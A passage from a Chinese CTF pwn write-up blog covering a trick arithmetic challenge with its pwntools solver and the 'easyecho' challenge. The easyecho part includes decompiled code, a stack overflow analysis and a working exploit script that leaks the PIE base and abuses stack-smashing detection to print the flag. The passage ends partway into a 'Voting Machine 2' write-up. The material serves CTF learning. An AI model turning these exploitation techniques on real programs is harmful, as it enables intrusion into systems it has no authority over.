class="hljs-built_in">push_back</span>(<span class="hljs-string">&#x27;&#125;&#x27;</span>);<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;/&#x27;</span>:<br>s.<span class="hljs-built_in">push_back</span>(<span class="hljs-string">&#x27;[&#x27;</span>);<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;\\&#x27;</span>:<br>s.<span class="hljs-built_in">push_back</span>(<span class="hljs-string">&#x27;]&#x27;</span>);<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;2&#x27;</span>:<br>s.<span class="hljs-built_in">push_back</span>(<span class="hljs-string">&#x27;|&#x27;</span>);<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;.&#x27;</span>:<br>s.<span class="hljs-built_in">push_back</span>(<span class="hljs-string">&#x27;:&#x27;</span>);<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;%&#x27;</span>:<br>s.<span class="hljs-built_in">push_back</span>(<span class="hljs-string">&#x27;;&#x27;</span>);<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;|&#x27;</span>:<br>s.<span class="hljs-built_in">push_back</span>(<span class="hljs-string">&#x27;\&quot;&#x27;</span>);<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;,&#x27;</span>:<br>s.<span class="hljs-built_in">push_back</span>(<span class="hljs-string">&#x27;\&#x27;&#x27;</span>);<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;@&#x27;</span>:<br>s.<span class="hljs-built_in">push_back</span>(<span class="hljs-string">&#x27;&lt;&#x27;</span>);<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;&#123;&#x27;</span>:<br>s.<span class="hljs-built_in">push_back</span>(<span class="hljs-string">&#x27;&gt;&#x27;</span>);<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;u&#x27;</span>:<br>s.<span class="hljs-built_in">push_back</span>(<span class="hljs-string">&#x27;,&#x27;</span>);<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;7&#x27;</span>:<br>s.<span class="hljs-built_in">push_back</span>(<span class="hljs-string">&#x27;.&#x27;</span>);<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;y&#x27;</span>:<br>s.<span class="hljs-built_in">push_back</span>(<span class="hljs-string">&#x27;?&#x27;</span>);<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;a&#x27;</span>:<br>s.<span class="hljs-built_in">push_back</span>(<span class="hljs-string">&#x27;/&#x27;</span>);<br><span class="hljs-keyword">break</span>;<br>&#125;<br>&#125;<br>cout &lt;&lt; s &lt;&lt; endl;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="小学数学"><a href="#小学数学" class="headerlink" title="小学数学"></a>小学数学</h2><h3 id="题目："><a href="#题目：" class="headerlink" title="题目："></a>题目：</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">import</span> signal<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ran</span>():<br>    <span class="hljs-keyword">return</span> random.randint(<span class="hljs-number">999</span>,<span class="hljs-number">99999</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>():<br>    question = <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;ran()&#125;</span> + <span class="hljs-subst">&#123;ran()&#125;</span> = &quot;</span><br><br>    <span class="hljs-built_in">print</span>(question.replace(<span class="hljs-string">&#x27;+&#x27;</span>,<span class="hljs-string">&#x27;-&#x27;</span>))<br>    answer = <span class="hljs-built_in">eval</span>(question[:-<span class="hljs-number">2</span>])<br>    <br>    calc = <span class="hljs-built_in">input</span>()<br>    <span class="hljs-keyword">if</span> calc == <span class="hljs-built_in">str</span>(answer):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Correct.&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Wrong.&quot;</span>)<br>        exit(<span class="hljs-number">0</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sub</span>():<br>    question = <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;ran()&#125;</span> - <span class="hljs-subst">&#123;ran()&#125;</span> = &quot;</span><br><br>    <span class="hljs-built_in">print</span>(question.replace(<span class="hljs-string">&#x27;-&#x27;</span>,<span class="hljs-string">&#x27;x&#x27;</span>))<br>    answer = <span class="hljs-built_in">eval</span>(question[:-<span class="hljs-number">2</span>])<br>    <br>    calc = <span class="hljs-built_in">input</span>()<br>    <span class="hljs-keyword">if</span> calc == <span class="hljs-built_in">str</span>(answer):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Correct.&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Wrong.&quot;</span>)<br>        exit(<span class="hljs-number">0</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">mul</span>():<br>    question = <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;ran()&#125;</span> x <span class="hljs-subst">&#123;ran()&#125;</span> = &quot;</span><br><br>    <span class="hljs-built_in">print</span>(question.replace(<span class="hljs-string">&#x27;x&#x27;</span>,<span class="hljs-string">&#x27;//&#x27;</span>))<br>    answer = <span class="hljs-built_in">eval</span>(question[:-<span class="hljs-number">2</span>].replace(<span class="hljs-string">&#x27;x&#x27;</span>,<span class="hljs-string">&#x27;*&#x27;</span>))<br>    <br>    calc = <span class="hljs-built_in">input</span>()<br>    <span class="hljs-keyword">if</span> calc == <span class="hljs-built_in">str</span>(answer):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Correct.&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Wrong.&quot;</span>)<br>        exit(<span class="hljs-number">0</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">div</span>():<br>    question = <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;ran()&#125;</span> // <span class="hljs-subst">&#123;ran()&#125;</span> = &quot;</span><br><br>    <span class="hljs-built_in">print</span>(question.replace(<span class="hljs-string">&#x27;//&#x27;</span>,<span class="hljs-string">&#x27;%&#x27;</span>))<br>    answer = <span class="hljs-built_in">eval</span>(question[:-<span class="hljs-number">2</span>])<br>    <br>    calc = <span class="hljs-built_in">input</span>()<br>    <span class="hljs-keyword">if</span> calc == <span class="hljs-built_in">str</span>(answer):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Correct.&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Wrong.&quot;</span>)<br>        exit(<span class="hljs-number">0</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">mod</span>():<br>    question = <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;ran()&#125;</span> % <span class="hljs-subst">&#123;ran()&#125;</span> = &quot;</span><br><br>    <span class="hljs-built_in">print</span>(question.replace(<span class="hljs-string">&#x27;%&#x27;</span>,<span class="hljs-string">&#x27;+&#x27;</span>))<br>    answer = <span class="hljs-built_in">eval</span>(question[:-<span class="hljs-number">2</span>])<br>    <br>    calc = <span class="hljs-built_in">input</span>()<br>    <span class="hljs-keyword">if</span> calc == <span class="hljs-built_in">str</span>(answer):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Correct.&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Wrong.&quot;</span>)<br>        exit(<span class="hljs-number">0</span>)<br><br><br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;  ____ ____   ___  _   _    ____ _____ _____ &quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot; / ___|  _ \ / _ \| | | |  / ___|_   _|  ___|&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;| |  _| | | | | | | | | | | |     | | | |_   &quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;| |_| | |_| | |_| | |_| | | |___  | | |  _|  &quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot; \____|____/ \___/ \___/   \____| |_| |_|    &quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Welcome to the calculate challenge. Please try to solve 300 Question in 600 seconds.&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;ATTENTION: This is an April Fool&#x27;s game, and the real problem may not be what it seems&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&quot;</span>)<br><span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;Press Enter to start...&quot;</span>)<br>signal.alarm(<span class="hljs-number">600</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">300</span>):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Round: &quot;</span>+<span class="hljs-built_in">str</span>(i+<span class="hljs-number">1</span>))<br>    random.choice([add,sub,mul,div,mod])()<br><br><br>flag = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;/flag&#x27;</span>).read()<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Congratulations on passing the challenge. This is your flag: &quot;</span> + <span class="hljs-built_in">str</span>(flag))<br></code></pre></td></tr></table></figure><p>说实在的我真觉得这个出题人很胡闹的，很震惊，怎么会有人有这种恶趣味。</p><h3 id="EXP-5"><a href="#EXP-5" class="headerlink" title="EXP:"></a>EXP:</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment"># context.log_level = &#x27;debug&#x27;</span><br>io = remote(<span class="hljs-string">&#x27;&#x27;</span>,)<br>io.sendline(<span class="hljs-string">b&#x27;&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;plz wait..&#x27;</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">300</span>):<br>    io.recvuntil(<span class="hljs-built_in">str</span>(i+<span class="hljs-number">1</span>).encode())<br>    num1 = <span class="hljs-built_in">int</span>(io.recvuntil(<span class="hljs-string">b&#x27; &#x27;</span>))<br>    op = io.recvuntil(<span class="hljs-string">b&#x27; &#x27;</span>)<br>    num2 = <span class="hljs-built_in">int</span>(io.recvuntil(<span class="hljs-string">b&#x27; &#x27;</span>))<br>    <span class="hljs-built_in">print</span>(num1, op[<span class="hljs-number">0</span>], num2)<br>    <span class="hljs-keyword">if</span>(op[<span class="hljs-number">0</span>] == <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;-&#x27;</span>)):<br>        io.sendline(<span class="hljs-built_in">str</span>(num1+num2).encode())<br>    <span class="hljs-keyword">elif</span>(op[<span class="hljs-number">0</span>] == <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;x&#x27;</span>)):<br>        io.sendline(<span class="hljs-built_in">str</span>(num1-num2).encode())<br>    <span class="hljs-keyword">elif</span>(op[<span class="hljs-number">0</span>] == <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;/&#x27;</span>)):<br>        io.sendline(<span class="hljs-built_in">str</span>(num1*num2).encode())<br>    <span class="hljs-keyword">elif</span>(op[<span class="hljs-number">0</span>] == <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;%&#x27;</span>)):<br>        io.sendline(<span class="hljs-built_in">str</span>(num1//num2).encode())<br>    <span class="hljs-keyword">else</span>:<br>        io.sendline(<span class="hljs-built_in">str</span>(num1%num2).encode())<br><br>io.interactive()<br></code></pre></td></tr></table></figure><h2 id="奇怪的ELF"><a href="#奇怪的ELF" class="headerlink" title="奇怪的ELF"></a>奇怪的ELF</h2><p>纯纯的逆向题或者有环境有钱就行，就是一个x86_64(amd64)一个arm64，要不然就两个架构的环境都有要不然qemu要不然就直接逆向，两个解得没有特别全，蒙也能蒙得到答案。</p><p>HNCTF{welcome_to_the_Linux_world!}</p>]]></content>
    
    
    <categories>
      
      <category>CTFPWN</category>
      
    </categories>
    
    
    <tags>
      
      <tag>pwn</tag>
      
      <tag>CTF</tag>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>近期NSSCTF刷题WP（一）</title>
    <link href="/2023/04/06/%E8%BF%91%E6%9C%9FNSSCTF%E5%88%B7%E9%A2%98WP%EF%BC%88%E4%B8%80%EF%BC%89/"/>
    <url>/2023/04/06/%E8%BF%91%E6%9C%9FNSSCTF%E5%88%B7%E9%A2%98WP%EF%BC%88%E4%B8%80%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h1 id="easyecho"><a href="#easyecho" class="headerlink" title="easyecho"></a>easyecho</h1><p>本题选自 2021 鹤城杯，题目描述为Ubuntu16。题目链接：<a href="https://www.nssctf.cn/problem/471">easyecho | NSSCTF</a>。</p><p>checksec：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs sh">ubuntu@ubuntu:~/Desktop$ checksec easyecho<br>[*] <span class="hljs-string">&#x27;/home/ubuntu/Desktop/easyecho&#x27;</span><br>    Arch:     amd64-64-little<br>    RELRO:    Full RELRO<br>    Stack:    Canary found<br>    NX:       NX enabled<br>    PIE:      PIE enabled<br>    FORTIFY:  Enabled<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 __fastcall <span class="hljs-title function_">main</span><span class="hljs-params">(__int64 a1, <span class="hljs-type">char</span> **a2, <span class="hljs-type">char</span> **a3)</span><br>&#123;<br>  <span class="hljs-type">bool</span> v3; <span class="hljs-comment">// zf</span><br>  __int64 v4; <span class="hljs-comment">// rcx</span><br>  <span class="hljs-type">char</span> *v5; <span class="hljs-comment">// rsi</span><br>  <span class="hljs-type">const</span> <span class="hljs-type">char</span> *v6; <span class="hljs-comment">// rdi</span><br>  <span class="hljs-type">char</span> v8[<span class="hljs-number">16</span>]; <span class="hljs-comment">// [rsp+0h] [rbp-A8h] BYREF</span><br>  __int64 (__fastcall *v9)(); <span class="hljs-comment">// [rsp+10h] [rbp-98h]</span><br>  <span class="hljs-type">char</span> v10[<span class="hljs-number">104</span>]; <span class="hljs-comment">// [rsp+20h] [rbp-88h] BYREF</span><br>  <span class="hljs-type">unsigned</span> __int64 v11; <span class="hljs-comment">// [rsp+88h] [rbp-20h]</span><br><br>  v11 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  sub_DA0(a1, a2, a3);<br>  sub_F40();<br>  v9 = sub_CF0;<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Hi~ This is a very easy echo server.&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Please give me your name~&quot;</span>);<br>  _printf_chk(<span class="hljs-number">1LL</span>, <span class="hljs-string">&quot;Name: &quot;</span>);<br>  sub_E40(v8);<br>  _printf_chk(<span class="hljs-number">1LL</span>, <span class="hljs-string">&quot;Welcome %s into the server!\n&quot;</span>, v8);<br>  <span class="hljs-keyword">do</span><br>  &#123;<br>    <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>    &#123;<br>      _printf_chk(<span class="hljs-number">1LL</span>, <span class="hljs-string">&quot;Input: &quot;</span>);<br>      gets(v10);<br>      _printf_chk(<span class="hljs-number">1LL</span>, <span class="hljs-string">&quot;Output: %s\n\n&quot;</span>, v10);<br>      v4 = <span class="hljs-number">9LL</span>;<br>      v5 = v10;<br>      v6 = <span class="hljs-string">&quot;backdoor&quot;</span>;<br>      <span class="hljs-keyword">do</span><br>      &#123;<br>        <span class="hljs-keyword">if</span> ( !v4 )<br>          <span class="hljs-keyword">break</span>;<br>        v3 = *v5++ == *v6++;<br>        --v4;<br>      &#125;<br>      <span class="hljs-keyword">while</span> ( v3 );<br>      <span class="hljs-keyword">if</span> ( !v3 )<br>        <span class="hljs-keyword">break</span>;<br>      (v9)(v6, v5);<br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">while</span> ( <span class="hljs-built_in">strcmp</span>(v10, <span class="hljs-string">&quot;exitexit&quot;</span>) );<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;See you next time~&quot;</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0LL</span>;<br>&#125;<span class="hljs-comment">// main</span><br></code></pre></td></tr></table></figure><p>sub_DA0函数做了缓冲区的setvbuf和alarm反调试，sub_F40函数是UI菜单图标字符画。</p><p>在第26行gets(v10)有一个明显可行的栈溢出漏洞，由于有canary和pie，我们暂时很难确定应该怎么获得这两个或应该获得哪一个。</p><p>31到38行是一个检测输入字符串是否与”backdoor”字符串相同的小检测。如果是，便执行sub_CF0函数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> __int64 __fastcall <span class="hljs-title function_">sub_E40</span><span class="hljs-params">(<span class="hljs-type">char</span> *buf, __int64 a2)</span><br>&#123;<br>  <span class="hljs-type">ssize_t</span> v4; <span class="hljs-comment">// rax</span><br>  <span class="hljs-type">int</span> v5; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">unsigned</span> __int64 v7; <span class="hljs-comment">// [rsp+8h] [rbp-20h]</span><br><br>  v7 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  <span class="hljs-keyword">while</span> ( a2 )<br>  &#123;<br>    v4 = read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">1uLL</span>);<br>    <span class="hljs-keyword">if</span> ( !v4 )<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">if</span> ( v4 == <span class="hljs-number">-1</span> )<br>    &#123;<br>      v5 = *_errno_location();<br>      <span class="hljs-keyword">if</span> ( v5 != <span class="hljs-number">11</span> &amp;&amp; v5 != <span class="hljs-number">4</span> )<br>        <span class="hljs-keyword">return</span> __readfsqword(<span class="hljs-number">0x28</span>u) ^ v7;<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>      <span class="hljs-keyword">if</span> ( *buf == <span class="hljs-number">10</span> )<br>      &#123;<br>        *buf = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">return</span> __readfsqword(<span class="hljs-number">0x28</span>u) ^ v7;<br>      &#125;<br>      ++buf;<br>    &#125;<br>    --a2;<br>  &#125;<br>  <span class="hljs-keyword">return</span> __readfsqword(<span class="hljs-number">0x28</span>u) ^ v7;<br>&#125;<span class="hljs-comment">// sub_E40</span><br></code></pre></td></tr></table></figure><p>sub_E40函数是一个关于输入的保护，在此不细分析。读者若未来会参与出题可自行研究这段内容。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">sub_CF0</span><span class="hljs-params">()</span><br>&#123;<br>  __int64 v0; <span class="hljs-comment">// rax</span><br>  <span class="hljs-type">int</span> v1; <span class="hljs-comment">// ebx</span><br>  <span class="hljs-type">unsigned</span> __int64 v3; <span class="hljs-comment">// [rsp+8h] [rbp-10h]</span><br><br>  v3 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  <span class="hljs-keyword">if</span> ( unk_2020A0 )<br>  &#123;<br>    <span class="hljs-keyword">return</span> __readfsqword(<span class="hljs-number">0x28</span>u) ^ v3;<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    unk_2020A0 = <span class="hljs-number">1</span>;<br>    v1 = open(<span class="hljs-string">&quot;./flag&quot;</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> ( v1 &lt; <span class="hljs-number">0</span> )<br>      perror(<span class="hljs-string">&quot;open&quot;</span>);<br>    read(v1, &amp;unk_202040, <span class="hljs-number">0x50</span>uLL);<br>    LODWORD(v0) = close(v1);<br>  &#125;<br>  <span class="hljs-keyword">return</span> v0;<br>&#125;<span class="hljs-comment">// sub_CF0</span><br></code></pre></td></tr></table></figure><p>sub_CF0函数很明显是读入flag文件并将其放到0x202040上。</p><p>相对来说就很明朗了，考点是Stack Smashing Detected，第一次输入泄漏PIE基址，再次输入”backdoor”去调用一次sub_CF0，然后修改__libc_argv[0]指向0x202040，最后利用SSP去get flag（没有get shell和cat flag过程了）。</p><p>修改__libc_argv[0]的指向位置的方法就是在调试中先输入<code>p &amp; __libc_argv[0]</code>去获得到argv[0]的位置，然后在<code>Input:</code>的后方的输入处断，得到输入处与argv[0]的距离，计算可以使用指令<code>distance (input_addr) (argv[0]_addr)</code>，本题可以得到偏移为0x168。</p><p>EXP：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>io = process(<span class="hljs-string">&#x27;./easyecho&#x27;</span>)<br>io.sendline(<span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x10</span>)<br>io.recvuntil(<span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x10</span>)<br>pie = u64(io.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>sleep(<span class="hljs-number">0.1</span>)<br>io.sendlineafter(<span class="hljs-string">b&quot;Input:&quot;</span>, <span class="hljs-string">b&#x27;backdoor&#x27;</span>)<br>sleep(<span class="hljs-number">0.1</span>)<br>io.sendlineafter(<span class="hljs-string">b&#x27;Input:&#x27;</span>, <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x168</span> + p64(<span class="hljs-number">0x202040</span> + pie - <span class="hljs-number">0xcf0</span>))<br>sleep(<span class="hljs-number">0.1</span>)<br>io.sendlineafter(<span class="hljs-string">b&#x27;Input:&#x27;</span>, <span class="hljs-string">b&#x27;exitexit&#x27;</span>)<br>io.interactive()<br></code></pre></td></tr></table></figure><p>注：pie - 0xcf0为求PIE基址，pie recv部分求得是PIE + offset &#x3D; real_addr。offset仅占用十六进制后三位，PIE占用其他位，类似于glibc调用方法。</p><h1 id="Voting-Machine-2"><a href="#Voting-Machine-2" class="headerlink" title="Voting Machine 2"></a>Voting Machine 2</h1><p>本题选自 watervrCTF 2019，题目描述为<code>In a world with many uncertainties we need some kind of structure. Democracy is a big part of that, therefore we need voting machines! Well, at least if they are safe...Ubuntu18</code>。题目链接：<a href="https://www.nssctf.cn/problem/87">Voting Machine 2 | NSSCTF</a>。</p><p>checksec：</p><p>注：我将文件名修改为了VM，为了方便我自己进行修改、输入与调试。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs sh">ubuntu@ubuntu:~/Desktop$ checksec VM<br>[*] <span class="hljs-string">&#x27;/home/ubuntu/Desktop/VM&#x27;</span><br>    Arch:     i386-32-little<br>    RELRO:    Partial RELRO<br>    Stack:    No canary found<br>    NX:       NX enabled<br>    PIE:      No PIE (0x8048000)<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span 